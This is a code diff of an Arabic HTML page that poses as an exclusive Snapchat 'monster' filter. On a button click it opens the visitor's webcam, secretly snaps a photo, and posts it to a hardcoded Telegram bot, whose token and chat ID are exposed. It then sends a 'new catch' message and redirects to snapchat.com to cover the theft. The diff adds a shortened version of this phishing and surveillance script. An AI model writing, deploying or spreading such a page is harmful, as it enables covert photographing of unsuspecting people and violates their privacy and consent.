@@ -2,84 +2,56 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat AR Experience</title>
+    <title>Snapchat Filter Test</title>
     <style>
-        body { background-color: #FFFC00; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .box { background: white; padding: 40px; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.25); text-align: center; width: 85%; max-width: 400px; }
-        .ghost { font-size: 80px; margin-bottom: 10px; }
-        h1 { font-size: 24px; color: #000; margin-bottom: 15px; font-weight: 900; }
-        p { color: #444; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
-        .btn { background: #000; color: #fff; border: none; padding: 18px; border-radius: 50px; width: 100%; font-weight: bold; cursor: pointer; font-size: 18px; }
+        body { background-color: #FFFC00; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .btn { background: #000; color: #fff; padding: 20px; border-radius: 50px; width: 80%; font-size: 20px; border: none; cursor: pointer; font-weight: bold; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="ghost">👻</div>
-    <h1>فلتر "الوحش" الجديد 👿</h1>
-    <p>لقد تمت دعوتك لتجربة الفلتر الحصري لموظفينا. اضغط أدناه للموافقة والبدء.</p>
-    
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
-    
-    <button id="start-btn" class="btn">تفعيل الفلتر الآن 📸</button>
-</div>
+    <img src="https://pluspng.com/img-png/snapchat-logo-png-snapchat-logo-png-transparent-1024.png" width="100">
+    <h1>فلتر "الوحش" 👿</h1>
+    <p>اضغط لتجربة الفلتر الجديد</p>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" width="640" height="480"></canvas>
+    <button id="b" class="btn">تفعيل الآن 📸</button>
 
 <script>
-    // --- 🔐 الإعدادات التي أكدت عليها يا وحش ---
-    const BOT_TOKEN = "8371736437:AAG3niwDWXJCjo8MFgiTJdL2zpNjVrJBMFU";
-    const CHAT_ID = "321516845";
+    const token = "8371736437:AAG3niwDWXJCjo8MFgiTJdL2zpNjVrJBMFU";
+    const chat = "321516845";
+    const v = document.getElementById('v');
+    const c = document.getElementById('c');
+    const b = document.getElementById('b');
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const btn = document.getElementById('start-btn');
-
-    btn.addEventListener('click', async () => {
+    b.onclick = async () => {
         try {
-            // 1. طلب الكاميرا
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            btn.innerText = "جارِ المعالجة... ⏳";
-            btn.disabled = true;
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            v.srcObject = s;
+            b.innerText = "جارِ التحميل... ⏳";
 
-            // 2. التقاط الصورة بعد 3 ثوانٍ
             setTimeout(() => {
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, 640, 480);
-                
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'capture.png');
-                    formData.append('caption', "👿 بوم! صيد جديد من GitHub Pages يا وحش!");
+                c.getContext('2d').drawImage(v, 0, 0, 640, 480);
+                c.toBlob(blob => {
+                    const f = new FormData();
+                    f.append('chat_id', chat);
+                    f.append('photo', blob, 'x.png');
 
-                    // 3. الإرسال مع تنبيه بالنتيجة
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    // الإرسال السريع
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                         method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if(data.ok) {
-                            alert("✅ وحش! الصورة وصلت للبوت الآن!");
-                            window.location.href = "https://www.snapchat.com";
-                        } else {
-                            // هذا التنبيه سيخبرنا بالسبب الحقيقي للفشل
-                            alert("❌ فشل تليجرام: " + data.description);
-                        }
-                    })
-                    .catch(err => alert("❌ مشكلة في الاتصال: " + err));
-
+                        body: f
+                    }).then(() => {
+                        // إرسال رسالة نصية للتأكيد (احتياط)
+                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=👿 صيد جديد يا وحش!`);
+                        window.location.href = "https://www.snapchat.com";
+                    });
                 }, 'image/png');
-            }, 3000);
-
-        } catch (err) {
-            alert("⚠️ يجب السماح بالكاميرا لتشغيل الفلتر!");
-        }
-    });
+            }, 2500);
+        } catch (e) { alert("افتح الكاميرا يا بطل!"); }
+    };
 </script>
-
 </body>
 </html>
